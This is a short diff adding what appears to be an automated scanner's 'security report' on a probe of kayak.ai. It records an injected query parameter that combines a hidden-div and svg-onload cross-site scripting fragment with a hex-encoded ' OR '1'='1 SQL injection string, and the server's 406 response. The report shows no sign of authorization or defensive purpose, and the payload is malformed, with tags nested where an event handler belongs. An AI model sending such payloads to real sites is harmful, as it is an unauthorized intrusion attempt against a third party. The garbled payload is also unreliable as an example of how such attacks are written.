@@ -1,0 +1,6 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: kayak.ai?q=<div style='display:none'><svg onload=<div style='display:none'>\x27\x20\x4f\x52\x20\x27\x31\x27\x3d\x27\x31<
+
+[STATUS]: 406
+[PAYLOAD]: <div style='display:none'><svg onload=<div style='display:none'>\x27\x20\x4f\x52\x20\x27\x31\x27\x3d\x27\x31</div>></div>
+---
